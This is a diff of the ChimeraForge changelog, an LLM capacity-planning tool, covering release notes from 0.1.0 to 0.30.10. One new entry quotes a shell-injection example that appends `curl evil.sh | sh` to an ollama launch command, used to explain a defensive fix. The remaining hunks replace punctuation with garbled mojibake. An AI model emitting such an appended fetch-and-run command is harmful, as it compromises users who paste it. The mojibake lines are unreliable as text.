@@ -16,6 +16,9 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
 ### Added
 - **`plan --quality-from results.json`: ingest a real eval harness.** Reads `lm-evaluation-harness` output -- chosen because it is what the industrial quantization-recovery literature emits and it has a versioned machine-readable schema, where HELM is in maintenance mode and `openai/evals` redirects to a dashboard. The score **replaces** the bundled composite rather than blending with it: an MMLU accuracy and the 20-item composite are different scales, and averaging or ranking across them would fabricate a comparison, so the metric name travels with the cell and `--quality-target` is read against whichever is in force. A 7,723-item task resolves to under 2pp where the bundled 20 resolve 20.9. An unrecognised file is an **error**, not an empty ingest -- a silent zero-cell read would leave the user believing their eval was in force. Golden-file tested against a captured real run, including the case where `"f1_stderr,none"` is legitimately the string `"N/A"`. Exposed on the MCP `plan` tool.
 
+## [0.30.10] - 2026-09-04
+
+### Fixed
 - **Shell injection reached the one backend the fix missed.** 0.30.9 quoted the model identifier for vllm/tgi/sglang but left `ollama run {tag}` raw -- and ollama wins the default plan for most registry queries, so it is the most-emitted command, not an edge case. `ollama run llama3.2:3b; curl evil.sh | sh` was produced verbatim for a human to paste. The test class asserting this property parametrized exactly the three backends that were already correct.
 - **An identifier naming a different model generation resolved to the wrong model's facts.** 0.30.1 stopped `llama3.1:405b` becoming an 8B, but only when a size token parsed. `phi-4` carries none, and the `phi` family has exactly one registry member, so it returned phi-2: **2.78B params and 6.69 GB for a 14.66B model**, with phi-2's measured quality and refusal rate attached. A generation marker that differs is now refused; an absent one (`phi:latest`) still resolves, since that is not a claim about a different model.
 - **An approximated alias no longer stamps VRAM `measured`.** 0.30.1 downgraded quality and safety for approximations but left VRAM, on the reasoning that it is exact arithmetic. It is -- over the *alias's* architecture. Exact arithmetic on the wrong shape is not a measurement.
@@ -562,7 +565,7 @@ so a published audit can be re-derived from its own raw output without a GPU.
 ## [0.13.0] - 2026-08-09
 
 ### Added
-- **Launch-command export (`plan --launch`) — the plan now tells you how to run it.**
+- **Launch-command export (`plan --launch`) â€” the plan now tells you how to run it.**
   Emits a copy-paste `vllm serve` / `ollama run` / TGI `docker run` command for the
   recommended config, with the flags *derived from the plan itself*: context length
   (`--max-model-len` / `--max-total-tokens` / `num_ctx`), tensor-parallel degree
@@ -594,7 +597,7 @@ so a published audit can be re-derived from its own raw output without a GPU.
 
 Four correctness defects, found by probing the published package the way an outside
 user meets it rather than by reading the source. All four produced a confident answer
-that was wrong, or no answer with no reason — the two outcomes a planner can least
+that was wrong, or no answer with no reason â€” the two outcomes a planner can least
 afford, because neither looks like a failure. Full findings and reproductions in
 [`docs/ax-audit-2026-08.md`](docs/ax-audit-2026-08.md).
 
@@ -606,25 +609,25 @@ afford, because neither looks like a failure. Full findings and reproductions in
   answered with llama3.1-8b's 8.03B parameters and 4.55 GB of VRAM, and
   `--model-size banana` planned happily across 129 rows. Nothing in the output said
   the request had been changed. Both paths now raise `ResolverError`, and the message
-  names the registry's span and both escape hatches — `--model` for a real HF/Ollama
-  resolve, `--params-b` to override — because a refusal that does not say what would
+  names the registry's span and both escape hatches â€” `--model` for a real HF/Ollama
+  resolve, `--params-b` to override â€” because a refusal that does not say what would
   work is a dead end.
 - **`--json` was not a contract.** Human-readable text went to the same stream as the
   payload, so output stopped being JSON while the exit code still said success. Fixed
   in four places: the unknown-hardware warning, `catalog`'s empty-state message, and
   `--list-hardware` / `--list-models`, which ignored `--json` entirely and printed
-  box-drawing tables. `--list-hardware` mattered most — it is the only way to discover
+  box-drawing tables. `--list-hardware` mattered most â€” it is the only way to discover
   a valid `--hardware` value, so it is the listing an automated caller most needs to
   read. Diagnostics now go to a stderr console.
 - **An empty result did not explain itself.** `summarize_trace()` already existed and
   already said why nothing fit; it was gated behind `not output_json`, so the
   explanation was withheld from exactly the caller that cannot infer it. The commonest
-  case is the default `--budget` of 100 USD/month excluding every datacenter GPU — an
+  case is the default `--budget` of 100 USD/month excluding every datacenter GPU â€” an
   H100 at the DB's own $2.50/hr is about $1,825/month. It now prints to stderr under
   `--json`, so stdout stays exactly one array and `| jq` keeps working:
   `blocked at budget gate - ollama: $1800/mo (N=1) > $100`.
 - **An unknown `--hardware` was substituted, not refused.** It warned and then planned
-  on RTX 4080 12GB specs, returning a full result set about a GPU nobody asked for —
+  on RTX 4080 12GB specs, returning a full result set about a GPU nobody asked for â€”
   and because the warning went to stdout, a caller stripping non-JSON lines to recover
   the payload got those rows with nothing recording the substitution. Now refused,
   with the known GPUs listed.
@@ -636,7 +639,7 @@ afford, because neither looks like a failure. Full findings and reproductions in
   `pip install` had no way to find it.
 - Five tests were rewritten because they specified the defect: one asserted that
   `"100b"` returns `llama3.1-8b`, another that `"abc"` returns every model. The
-  instinct behind them — "should not crash" — is right, and a clean refusal satisfies
+  instinct behind them â€” "should not crash" â€” is right, and a clean refusal satisfies
   it while a wrong number does not. The replacements assert the refusal, that the
   message names the way forward, and that the size classes the registry *does* hold
   still resolve.
@@ -649,7 +652,7 @@ afford, because neither looks like a failure. Full findings and reproductions in
   dependencies, so `build_server()`'s `from mcp.server.fastmcp import FastMCP`
   raised and the server never started. The README client configs (Claude Code,
   Claude Desktop / Cursor) and the MCP registry manifest now use
-  `uvx --from "chimeraforge[mcp]" chimeraforge mcp` — expressed in `server.json`
+  `uvx --from "chimeraforge[mcp]" chimeraforge mcp` â€” expressed in `server.json`
   via `runtimeArguments` so registry clients compose the identical command.
 
 ## [0.12.1] - 2026-08-08
@@ -674,19 +677,19 @@ afford, because neither looks like a failure. Full findings and reproductions in
 ## [0.12.0] - 2026-08-07
 
 ### Added
-- **MCP server — ChimeraForge is now callable by Claude / GPT / Cursor and any MCP
+- **MCP server â€” ChimeraForge is now callable by Claude / GPT / Cursor and any MCP
   client.** `chimeraforge mcp` runs a stdio server (new `mcp` extra:
   `pip install "chimeraforge[mcp]"`) exposing three tools: `chimeraforge_plan`
   (the full gate search), `chimeraforge_resolve_model` (grounds a model's real
   params/architecture), and `chimeraforge_list_hardware`. GPU-sizing is exactly
-  where assistants fail — stale training-cutoff prices/specs plus error-prone KV/
-  batching arithmetic — so the tools let an assistant answer "what GPU do I need /
+  where assistants fail â€” stale training-cutoff prices/specs plus error-prone KV/
+  batching arithmetic â€” so the tools let an assistant answer "what GPU do I need /
   will it fit / how much will it cost" from measured data instead of guessing.
   Every result surfaces the `provenance` (measured/estimated/unknown) contract, and
   the tool descriptions tell the model to prefer the tool over its own knowledge.
 - **Shared planning core (`planner/service.py: run_plan`).** The CLI and the MCP
-  server now go through one presentation-free orchestration path (load → resolve →
-  gate search → pareto) instead of duplicating logic — the MCP tools call it
+  server now go through one presentation-free orchestration path (load â†’ resolve â†’
+  gate search â†’ pareto) instead of duplicating logic â€” the MCP tools call it
   in-process, not by shelling out to the CLI.
 
 ### Fixed
@@ -699,22 +702,22 @@ afford, because neither looks like a failure. Full findings and reproductions in
 
 ### Added
 - **Pipeline parallelism.** New `plan --pipeline-parallel {N|auto}` (alias `--pp`):
-  split a model's *layers* into N sequential stages across N GPUs — another way to
+  split a model's *layers* into N sequential stages across N GPUs â€” another way to
   fit a model too big for one GPU. Complements 0.10.0's tensor parallelism; the two
   suit different interconnects.
   - **VRAM**: weights and each stage's KV shard 1/N with **no attention-head cap**
     (unlike TP), so PP scales past `n_kv_heads` for GQA models.
-  - **Throughput** (`ThroughputModel.pp_decode_tps`): N stages give ~N× aggregate
+  - **Throughput** (`ThroughputModel.pp_decode_tps`): N stages give ~NÃ— aggregate
     HBM bandwidth, and PP's only comms is a **small point-to-point activation pass**
-    (no all-reduce) — so PP barely degrades on slow PCIe where TP collapses (per
+    (no all-reduce) â€” so PP barely degrades on slow PCIe where TP collapses (per
     vLLM's own guidance). The cost is the **GPipe pipeline bubble**: a decode step
     traverses every stage, so PP needs enough in-flight sequences to stay full
-    (efficiency `batch/(batch+pp-1)`) — near-ideal at high batch, poor at batch 1.
+    (efficiency `batch/(batch+pp-1)`) â€” near-ideal at high batch, poor at batch 1.
     Warns when under-filled. First-principles **estimate** (bubble modelled, not
     measured).
   - `auto` picks the smallest PP degree that *fits* (fewest GPUs); a high-throughput
     load may need a higher explicit degree. `Candidate` gains `pipeline_parallel`.
-  - **TP and PP cannot be combined yet** (MVP) — setting both above 1 errors cleanly.
+  - **TP and PP cannot be combined yet** (MVP) â€” setting both above 1 errors cleanly.
   - `pp=1` (the default) reproduces the pre-0.11.0 single-GPU results exactly.
 
 ## [0.10.0] - 2026-08-07
@@ -744,18 +747,18 @@ afford, because neither looks like a failure. Full findings and reproductions in
   can quantize the KV cache independently of the weights (llama.cpp
   `--cache-type-k`, vLLM fp8 KV); the planner now models it (q8 = 1 byte, q4 = 0.5
   byte per element vs FP16's 2). A quantized cache **lowers VRAM and raises the
-  KV-bound concurrency cap** — largest at long context, where KV dominates.
+  KV-bound concurrency cap** â€” largest at long context, where KV dominates.
   `VRAMModel.predict` / `kv_cache_gb` / `max_concurrent_seqs` take a `kv_bytes`
   argument (default FP16, so existing results are byte-identical).
   - Only VRAM/concurrency are modelled; KV-quant's (small) **quality impact is NOT
-    screened** (no bundled measurements) — `plan` warns when it is enabled and
+    screened** (no bundled measurements) â€” `plan` warns when it is enabled and
     never reports a fabricated quality delta.
 
 ### Changed
 - **Dependency ranges refreshed** against verified-passing versions (the full
-  suite runs green on all of these): runtime `rich` cap widened `<14.0` → `<16.0`
+  suite runs green on all of these): runtime `rich` cap widened `<14.0` â†’ `<16.0`
   (the old cap force-downgraded rich in users' environments); dev tools
-  `pytest` → `<10.0`, `pytest-cov` → `<8.0`, `pytest-asyncio` → `<2.0`.
+  `pytest` â†’ `<10.0`, `pytest-cov` â†’ `<8.0`, `pytest-asyncio` â†’ `<2.0`.
 
 ## [0.8.0] - 2026-08-05
 
@@ -926,28 +929,28 @@ prefill/decode disaggregation, goodput/Pareto), not replicas-of-single-stream.
 ## [0.5.0] - 2026-06-24
 
 ### Added
-- **Model-agnostic planning.** `plan --model <id>` accepts any model identifier —
+- **Model-agnostic planning.** `plan --model <id>` accepts any model identifier â€”
   a registry name, an Ollama tag (`ollama:NAME` / colon tags), or a Hugging Face
-  repo (`org/name`) — and resolves real parameters + attention geometry instead
+  repo (`org/name`) â€” and resolves real parameters + attention geometry instead
   of being limited to the bundled registry. Sources (priority order): manual
   overrides (`--params-b/--n-layers/--n-kv-heads/--d-head`), registry, on-disk
   spec cache, Ollama `/api/show`, HF `config.json` + `safetensors` param count,
   then offline family/size approximation (`planner.resolver`).
-- **`suggest`** — discover and rank deployable models from a live Ollama
+- **`suggest`** â€” discover and rank deployable models from a live Ollama
   (`/api/tags`), the HF Hub (top text-generation), and/or the local catalog,
   through the same gate search (`planner.discovery`).
-- **`catalog`** — build a persisted spec catalog from a curated seed
+- **`catalog`** â€” build a persisted spec catalog from a curated seed
   (`catalog --build`) so `suggest --source catalog` ranks models fully offline.
-- **`measure`** / **`plan --measure`** — benchmark a live model (real N=1
-  throughput, service time, and concurrency scaling → serial fraction) and fold
+- **`measure`** / **`plan --measure`** â€” benchmark a live model (real N=1
+  throughput, service time, and concurrency scaling â†’ serial fraction) and fold
   it into a local `fitted_models.json` via the `refit` loop, so plans run on
   measured numbers (provenance: `measured`) rather than estimates.
 - **Per-prediction provenance** (`measured` / `estimated` / `unknown`) on every
   candidate, surfaced in output (`~` markers) and as warnings.
-- **Rejection diagnostics** — `plan` reports the binding gate ("Why nothing fit")
+- **Rejection diagnostics** â€” `plan` reports the binding gate ("Why nothing fit")
   on an empty result.
 - Roofline throughput estimate for off-registry models (memory-bandwidth bound).
-- Broader quant support: legacy and i-quants (`Q4_0`, `Q5_1`, `IQ4_XS`, …) are
+- Broader quant support: legacy and i-quants (`Q4_0`, `Q5_1`, `IQ4_XS`, â€¦) are
   recognised with effective bits-per-weight, so a model's native quant is costed
   correctly instead of silently defaulting to FP16.
 - `resolve` extra (`httpx`) for network metadata resolution.
@@ -955,12 +958,12 @@ prefill/decode disaggregation, goodput/Pareto), not replicas-of-single-stream.
 ### Fixed
 - **Throughput scaling across instances is now linear.** `n_agents` counts
   independent GPU replicas (VRAM and cost are per-GPU), so total throughput scales
-  linearly; the previous Amdahl serial-fraction model wrongly capped it at ~1.8×
-  regardless of instance count, rejecting essentially every model ≥7B. (Per-GPU
+  linearly; the previous Amdahl serial-fraction model wrongly capped it at ~1.8Ã—
+  regardless of instance count, rejecting essentially every model â‰¥7B. (Per-GPU
   batching throughput is intentionally future work.)
-- **`cost_per_1m_tok` no longer understated by the instance count** — it now uses
+- **`cost_per_1m_tok` no longer understated by the instance count** â€” it now uses
   the N-GPU cost to match the N-GPU throughput, so adding identical replicas
-  leaves $/token unchanged (was N× too low).
+  leaves $/token unchanged (was NÃ— too low).
 
 ### Changed
 - `plan` / `suggest` prefer a measured corpus
@@ -969,26 +972,26 @@ prefill/decode disaggregation, goodput/Pareto), not replicas-of-single-stream.
 ## [0.4.1] - 2026-06-22
 
 ### Added
-- CI matrix now covers Python 3.13 and 3.14 (was 3.10–3.12); added the 3.14
+- CI matrix now covers Python 3.13 and 3.14 (was 3.10â€“3.12); added the 3.14
   classifier.
 
 ### Fixed
 - `safety` and `eval` `--json` emit plain JSON (Rich syntax-highlighting disabled
   via `highlight=False`), so `--json | jq` is clean and parsing is robust when
   colour is forced (e.g. on CI).
-- Hardened the `safety --help` test to strip ANSI before matching option names —
+- Hardened the `safety --help` test to strip ANSI before matching option names â€”
   the v0.4.0 CI failure (Rich colourises `--help`, so `--prompts` was not a
   literal substring of the raw output).
 
 ## [0.4.0] - 2026-06-19
 
 ### Added
-- `chimeraforge safety` — live refusal screen. Runs user-provided probe prompts
+- `chimeraforge safety` â€” live refusal screen. Runs user-provided probe prompts
   against a running model, classifies refusals (rule-based, the TR134 regex
   baseline), and reports the measured refusal rate against the bundled gate data
   (expected, drift, RTSI tier); exits 1 below `--safety-target`. Behind the
   `chimeraforge[safety]` extra. Ollama backend (vLLM/TGI not yet); no attack
-  corpus is bundled — bring your own benchmark.
+  corpus is bundled â€” bring your own benchmark.
 - `Backend.generate_text()` returning response text (used by the safety screen).
 - Model-identity resolution (`planner.identity`): maps Ollama tags / HF paths to
   registry models by architecture-family + parameter count (not exact name), so
@@ -1000,7 +1003,7 @@ prefill/decode disaggregation, goodput/Pareto), not replicas-of-single-stream.
 - Planner safety gate (Gate 5): `plan --safety-target` rejects configs whose
   refusal rate (TR134/TR142) falls below the bar. Opt-in; off by default.
 - `SafetyModel` exposing per-(model, quant) refusal rate + RTSI risk tier,
-  bundled in `fitted_models.json` (GGUF quants only, lookup-only — no
+  bundled in `fitted_models.json` (GGUF quants only, lookup-only â€” no
   extrapolation, since safety does not generalise across cells per TR142/TR146).
 - Safety surfaced in `plan` output: refusal rate + RTSI risk in the
   recommendation panel, Safety column in the alternatives table, and
@@ -1027,11 +1030,11 @@ prefill/decode disaggregation, goodput/Pareto), not replicas-of-single-stream.
 ## [0.2.0] - 2026-03-08
 
 ### Added
-- `chimeraforge bench` CLI — live LLM inference benchmarking (Ollama, vLLM, TGI)
-- `chimeraforge eval` CLI — quality evaluation (exact match, ROUGE-L, BERTScore, coherence)
-- `chimeraforge report` CLI — Markdown/HTML report generation with statistical analysis
-- `chimeraforge compare` CLI — diff benchmark results across runs with delta analysis
-- `chimeraforge refit` CLI — Bayesian blending to update planner coefficients from bench data
+- `chimeraforge bench` CLI â€” live LLM inference benchmarking (Ollama, vLLM, TGI)
+- `chimeraforge eval` CLI â€” quality evaluation (exact match, ROUGE-L, BERTScore, coherence)
+- `chimeraforge report` CLI â€” Markdown/HTML report generation with statistical analysis
+- `chimeraforge compare` CLI â€” diff benchmark results across runs with delta analysis
+- `chimeraforge refit` CLI â€” Bayesian blending to update planner coefficients from bench data
 - Backend adapter pattern: OllamaBackend, VLLMBackend, TGIBackend
 - Three workload profiles: single, batch, server (Poisson arrivals)
 - Quantization sweep and context-length sweep modes
@@ -1064,7 +1067,7 @@ prefill/decode disaggregation, goodput/Pareto), not replicas-of-single-stream.
 ## [0.1.0] - 2025-01-15
 
 ### Added
-- `chimeraforge plan` CLI — predictive capacity planner
+- `chimeraforge plan` CLI â€” predictive capacity planner
 - 4-gate pipeline: VRAM, quality, latency, budget
 - 6 predictive models: VRAM, throughput, scaling, quality, cost, latency
 - Hardware DB with 15 GPUs
